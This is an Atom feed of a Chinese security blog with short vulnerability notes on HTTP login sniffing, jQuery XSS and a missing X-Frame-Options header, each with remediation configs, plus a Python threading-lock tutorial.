<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Teams Six</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.teamssix.com/"/>
  <updated>2019-11-21T14:02:47.894Z</updated>
  <id>https://www.teamssix.com/</id>
  
  <author>
    <name>Teams Six</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【漏洞笔记】基于HTTP连接的登录请求</title>
    <link href="https://www.teamssix.com/year/191121-220054.html"/>
    <id>https://www.teamssix.com/year/191121-220054.html</id>
    <published>2019-11-21T14:00:54.000Z</published>
    <updated>2019-11-21T14:02:47.894Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：基于HTTP连接的登录请求</p><p>风险等级：低</p><p>问题类型：信息泄露</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>应用程序使用HTTP连接接受客户端的登录请求，如果登录请求数据没有加密处理，有可能被攻击者嗅探到客户提交的请求数据，请求数据中一般包含用户名密码。</p><a id="more"></a><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>可能被同一个局域网内的攻击者嗅探到用户输入的登录数据，如账号和密码。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>在提交登录请求数据前加密请求数据或使用HTTPS连接发送登录请求数据。</p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<a href="https://blog.csdn.net/CHS007chs/article/details/52524322" target="_blank" rel="noopener">https://blog.csdn.net/CHS007chs/article/details/52524322</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：基于HTTP连接的登录请求&lt;/p&gt;
&lt;p&gt;风险等级：低&lt;/p&gt;
&lt;p&gt;问题类型：信息泄露&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;应用程序使用HTTP连接接受客户端的登录请求，如果登录请求数据没有加密处理，有可能被攻击者嗅探到客户提交的请求数据，请求数据中一般包含用户名密码。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="HTTP" scheme="https://www.teamssix.com/tags/HTTP/"/>
    
      <category term="信息泄露" scheme="https://www.teamssix.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】jQuery跨站脚本</title>
    <link href="https://www.teamssix.com/year/191120-214129.html"/>
    <id>https://www.teamssix.com/year/191120-214129.html</id>
    <published>2019-11-20T13:41:29.000Z</published>
    <updated>2019-11-20T14:03:21.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：jQuery跨站脚本</p><p>风险等级：低危</p><p>问题类型：使用已知漏洞的组件</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>关于jQuery：jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。</p><a id="more"></a><p>漏洞原理：jQuery中过滤用户输入数据所使用的正则表达式存在缺陷，可能导致 location.hash跨站漏洞</p><p>影响版本：</p><p>jquery-1.7.1~1.8.3</p><p>jquery-1.6.min.js，jquery-1.6.1.min.js，jquery-1.6.2.min.js</p><p>jquery-1.2~1.5</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>jQuery 1.4.2版本中，远程攻击者可利用该漏洞向页面中注入任意的HTML。</p><p>jQuery 1.6.3之前版本中，当使用location.hash选择元素时，通过特制的标签，远程攻击者利用该漏洞注入任意web脚本或HTML。</p><p>jQuery 3.0.0之前版本中，攻击者可利用该漏洞执行客户端代码。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href="https://jquery.com/" target="_blank" rel="noopener">https://jquery.com/</a></p><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix<br>参考文章：<br><a href="http://www.word666.com/wangluo/121052.html" target="_blank" rel="noopener">http://www.word666.com/wangluo/121052.html</a><br><a href="https://blog.csdn.net/qq_36119192/article/details/89811603" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/89811603</a><br><a href="https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html" target="_blank" rel="noopener">https://www.cnblogs.com/security4399/archive/2013/03/13/2958502.html</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-582</a><br><a href="http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798" target="_blank" rel="noopener">http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201801-798</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：jQuery跨站脚本&lt;/p&gt;
&lt;p&gt;风险等级：低危&lt;/p&gt;
&lt;p&gt;问题类型：使用已知漏洞的组件&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;关于jQuery：jQuery是美国程序员John Resig所研发的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="XSS" scheme="https://www.teamssix.com/tags/XSS/"/>
    
      <category term="jQuery" scheme="https://www.teamssix.com/tags/jQuery/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞笔记】X-Frame-Options Header未配置</title>
    <link href="https://www.teamssix.com/year/191119-144643.html"/>
    <id>https://www.teamssix.com/year/191119-144643.html</id>
    <published>2019-11-19T06:46:43.000Z</published>
    <updated>2019-11-20T13:58:02.928Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h1><p>漏洞名称：X-Frame-Options Header未配置</p><p>风险等级：低危</p><p>问题类型：管理员设置问题</p><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在&lt;忽略frame&gt;,&lt;忽略iframe&gt;,&lt;忽略embed&gt;或者&lt;忽略object&gt;中展现的标记。</p><p>网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，从而避免点击劫持（clickjacking）攻击。</p><p>X-Frame-Options有三个值：</p><a id="more"></a><h3 id="deny"><a href="#deny" class="headerlink" title="deny"></a>deny</h3><p>表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</p><h3 id="sameorigin"><a href="#sameorigin" class="headerlink" title="sameorigin"></a>sameorigin</h3><p>表示该页面可以在相同域名页面的 frame 中展示。</p><h3 id="allow-from-uri"><a href="#allow-from-uri" class="headerlink" title="allow-from uri"></a>allow-from uri</h3><p>表示该页面可以在指定来源的 frame 中展示。</p><p>换一句话说，如果设置为DENY，不光在别人的网站frame嵌入时会无法加载，在同域名页面中同样会无法加载。</p><p>另一方面，如果设置为SAMEORIGIN，那么页面就可以在同域名页面的frame中嵌套。正常情况下我们通常使用SAMEORIGIN参数。</p><h1 id="0x02-漏洞危害"><a href="#0x02-漏洞危害" class="headerlink" title="0x02 漏洞危害"></a>0x02 漏洞危害</h1><p>攻击者可以使用一个透明的、不可见的iframe，覆盖在目标网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上，导致被劫持。</p><p>也就是说网站内容可能被其他站点引用，可能遭受到点击劫持攻击。</p><h1 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h1><h3 id="配置-Apache"><a href="#配置-Apache" class="headerlink" title="配置 Apache"></a>配置 Apache</h3><p>配置 Apache 在所有页面上发送 X-Frame-Options 响应头，需要把下面这行添加到 ‘site’ 的配置中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header always set X-Frame-Options &quot;sameorigin&quot;</span><br></pre></td></tr></table></figure><p>要将 Apache 的配置 X-Frame-Options 设置成 deny , 按如下配置去设置你的站点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set X-Frame-Options &quot;deny&quot;</span><br></pre></td></tr></table></figure><p>要将 Apache 的配置 X-Frame-Options 设置成 allow-from，在配置里添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header set X-Frame-Options &quot;allow-from https://example.com/&quot;</span><br></pre></td></tr></table></figure><h3 id="配置-nginx配置"><a href="#配置-nginx配置" class="headerlink" title="配置 nginx配置"></a>配置 nginx配置</h3><p>nginx 发送 X-Frame-Options 响应头，把下面这行添加到 ‘http’, ‘server’ 或者 ‘location’ 的配置中:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_header X-Frame-Options sameorigin always;</span><br></pre></td></tr></table></figure><h3 id="配置-IIS配置"><a href="#配置-IIS配置" class="headerlink" title="配置 IIS配置"></a>配置 IIS配置</h3><p>IIS 发送 X-Frame-Options 响应头，添加下面的配置到 Web.config 文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;system.webServer&gt;</span><br><span class="line">  ...</span><br><span class="line">  &lt;httpProtocol&gt;</span><br><span class="line">    &lt;customHeaders&gt;</span><br><span class="line">      &lt;add name=&quot;X-Frame-Options&quot; value=&quot;sameorigin&quot; /&gt;</span><br><span class="line">    &lt;/customHeaders&gt;</span><br><span class="line">  &lt;/httpProtocol&gt;</span><br><span class="line">  ...</span><br><span class="line">&lt;/system.webServer&gt;</span><br></pre></td></tr></table></figure><h3 id="配置-HAProxy"><a href="#配置-HAProxy" class="headerlink" title="配置 HAProxy"></a>配置 HAProxy</h3><p>配置 HAProxy 发送 X-Frame-Options 头，添加这些到你的前端、监听 listen，或者后端的配置里面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rspadd X-Frame-Options:\ sameorigin</span><br></pre></td></tr></table></figure><p>或者，在更加新的版本中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http-response set-header X-Frame-Options sameorigin</span><br></pre></td></tr></table></figure><h3 id="配置-Express"><a href="#配置-Express" class="headerlink" title="配置 Express"></a>配置 Express</h3><p>要配置 Express 可以发送 X-Frame-Options header，你可以用借助了 frameguard 来设置头部的 helmet。在你的服务器配置里面添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const helmet = require(&apos;helmet&apos;);</span><br><span class="line">const app = express();</span><br><span class="line">app.use(helmet.frameguard(&#123; action: &quot;sameorigin&quot; &#125;));</span><br></pre></td></tr></table></figure><p>或者，你也可以直接用 frameguard：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const frameguard = require(&apos;frameguard&apos;)</span><br><span class="line">app.use(frameguard(&#123; action: &apos;sameorigin&apos; &#125;))</span><br></pre></td></tr></table></figure><blockquote><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><blockquote><p>参考文章：<br><a href="https://blog.whsir.com/post-3919.html" target="_blank" rel="noopener">https://blog.whsir.com/post-3919.html</a><br><a href="https://blog.csdn.net/qq_25934401/article/details/81384876" target="_blank" rel="noopener">https://blog.csdn.net/qq_25934401/article/details/81384876</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-概述&quot;&gt;&lt;a href=&quot;#0x00-概述&quot; class=&quot;headerlink&quot; title=&quot;0x00 概述&quot;&gt;&lt;/a&gt;0x00 概述&lt;/h1&gt;&lt;p&gt;漏洞名称：X-Frame-Options Header未配置&lt;/p&gt;
&lt;p&gt;风险等级：低危&lt;/p&gt;
&lt;p&gt;问题类型：管理员设置问题&lt;/p&gt;
&lt;h1 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h1&gt;&lt;p&gt;X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在&amp;lt;忽略frame&amp;gt;,&amp;lt;忽略iframe&amp;gt;,&amp;lt;忽略embed&amp;gt;或者&amp;lt;忽略object&amp;gt;中展现的标记。&lt;/p&gt;
&lt;p&gt;网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，从而避免点击劫持（clickjacking）攻击。&lt;/p&gt;
&lt;p&gt;X-Frame-Options有三个值：&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/categories/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="漏洞笔记" scheme="https://www.teamssix.com/tags/%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0/"/>
    
      <category term="X-Frame-Options" scheme="https://www.teamssix.com/tags/X-Frame-Options/"/>
    
  </entry>
  
  <entry>
    <title>【Python Threading 学习笔记】6、锁lock</title>
    <link href="https://www.teamssix.com/year/191105-121011.html"/>
    <id>https://www.teamssix.com/year/191105-121011.html</id>
    <published>2019-11-05T04:10:11.000Z</published>
    <updated>2019-11-05T04:24:19.696Z</updated>
    
    <content type="html"><![CDATA[<p>往期内容：</p><p><a href="https://www.teamssix.com/year/1901031-202253.html">1、什么是多线程？</a></p><p><a href="https://www.teamssix.com/year/191101-112015.html">2、添加线程</a></p><p><a href="https://www.teamssix.com/year/191102-102624.html">3、join功能</a></p><p><a href="https://www.teamssix.com/year/191103-092239.html">4、Queue功能</a></p><p><a href="https://www.teamssix.com/year/191104-101112.html">5、不一定有效率GIL</a></p><h1 id="0x00-关于线程锁lock"><a href="#0x00-关于线程锁lock" class="headerlink" title="0x00 关于线程锁lock"></a>0x00 关于线程锁lock</h1><p>多线程和多进程最大的不同在于，多进程中，同一个变量，各自有一份拷贝存在于每个进程中，互不影响，而多线程中，所有变量都由所有线程共享，所以，任何一个变量都可以被任何一个线程修改，因此，线程之间共享数据最大的危险在于多个线程同时改一个变量，把内容给改乱了。</p><p>而使用lock就可以在不同线程使用同一共享内存时，能够确保线程之间互不影响。</p><a id="more"></a><h1 id="0x01-不使用lock锁的情况"><a href="#0x01-不使用lock锁的情况" class="headerlink" title="0x01 不使用lock锁的情况"></a>0x01 不使用lock锁的情况</h1><p>job1：全局变量A的值每次加1，循环7次并打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br></pre></td></tr></table></figure><p>job2：全局变量A的值每次加10，循环7次并打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br></pre></td></tr></table></figure><p>main：定义两个线程并执行job1和job2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> <span class="comment"># 定义两个线程并执行job1和job2</span></span><br><span class="line">   t1 = threading.Thread(target=job1)</span><br><span class="line">   t2 = threading.Thread(target=job2)</span><br><span class="line">   t1.start()</span><br><span class="line">   t2.start()</span><br><span class="line">   t1.join()</span><br><span class="line">   t2.join()</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> <span class="comment"># 定义两个线程并执行job1和job2</span></span><br><span class="line">   t1 = threading.Thread(target=job1)</span><br><span class="line">   t2 = threading.Thread(target=job2)</span><br><span class="line">   t1.start()</span><br><span class="line">   t2.start()</span><br><span class="line">   t1.join()</span><br><span class="line">   t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   A = <span class="number">0</span></span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 6_lock.py</span></span><br><span class="line">job1 1</span><br><span class="line">job1 2</span><br><span class="line">job1 3</span><br><span class="line">job1 4</span><br><span class="line">job1 5job2 15</span><br><span class="line">job2 </span><br><span class="line">job1 2625</span><br><span class="line">job2</span><br><span class="line">job1 36 37</span><br><span class="line">job2 </span><br><span class="line">47</span><br><span class="line">job2 57</span><br><span class="line">job2 67</span><br><span class="line">job2 77</span><br></pre></td></tr></table></figure><p>可以看到不使用lock的时候，打印的结果很混乱。</p><h1 id="0x02-使用lock的情况"><a href="#0x02-使用lock的情况" class="headerlink" title="0x02 使用lock的情况"></a>0x02 使用lock的情况</h1><p>使用lock的方法是， 在每个线程执行运算修改共享内存之前，执行lock.acquire()将共享内存上锁， 确保当前线程执行时，内存不会被其他线程访问，执行运算完毕后，使用lock.release()将锁打开， 保证其他的线程可以使用该共享内存。</p><p>为job1和job2加锁：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire() <span class="comment"># 上锁</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br><span class="line">   lock.release() <span class="comment"># 开锁</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire() <span class="comment"># 上锁</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br><span class="line">   lock.release() <span class="comment"># 开锁</span></span><br></pre></td></tr></table></figure><p>在程序入口处定义一个lock</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   lock = threading.Lock()</span><br><span class="line">   A = <span class="number">0</span></span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job1</span><span class="params">()</span>:</span> <span class="comment"># 全局变量A的值每次加1，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">1</span></span><br><span class="line">      print(<span class="string">'job1'</span>,A)</span><br><span class="line">   lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">job2</span><span class="params">()</span>:</span><span class="comment"># 全局变量A的值每次加10，循环7次并打印</span></span><br><span class="line">   <span class="keyword">global</span> A,lock</span><br><span class="line">   lock.acquire()</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">      A += <span class="number">10</span></span><br><span class="line">      print(<span class="string">'job2'</span>,A)</span><br><span class="line">   lock.release()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span> <span class="comment"># 定义两个线程并执行job1和job2</span></span><br><span class="line">   t1 = threading.Thread(target=job1)</span><br><span class="line">   t2 = threading.Thread(target=job2)</span><br><span class="line">   t1.start()</span><br><span class="line">   t2.start()</span><br><span class="line">   t1.join()</span><br><span class="line">   t2.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   lock = threading.Lock()</span><br><span class="line">   A = <span class="number">0</span></span><br><span class="line">   main()</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python 6_lock.py</span></span><br><span class="line">job1 1</span><br><span class="line">job1 2</span><br><span class="line">job1 3</span><br><span class="line">job1 4</span><br><span class="line">job1 5</span><br><span class="line">job1 6</span><br><span class="line">job1 7</span><br><span class="line">job2 17</span><br><span class="line">job2 27</span><br><span class="line">job2 37</span><br><span class="line">job2 47</span><br><span class="line">job2 57</span><br><span class="line">job2 67</span><br><span class="line">job2 77</span><br></pre></td></tr></table></figure><p>从运行结果来看，使用lock后，一个线程一个线程的执行完，两个线程之间互不影响。<br>至此，整个【Python Threading 学习笔记】系列更新完毕。</p><blockquote><p>代码项目地址：<a href="https://github.com/teamssix/Python-Threading-study-notes" target="_blank" rel="noopener">https://github.com/teamssix/Python-Threading-study-notes</a><br>参考文章：<br>1、<a href="https://www.jianshu.com/p/05b6a6f6fdac" target="_blank" rel="noopener">https://www.jianshu.com/p/05b6a6f6fdac</a><br>2、<a href="https://morvanzhou.github.io/tutorials/python-basic/threading" target="_blank" rel="noopener">https://morvanzhou.github.io/tutorials/python-basic/threading</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期内容：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.teamssix.com/year/1901031-202253.html&quot;&gt;1、什么是多线程？&lt;/a&gt;&lt;/p&gt;
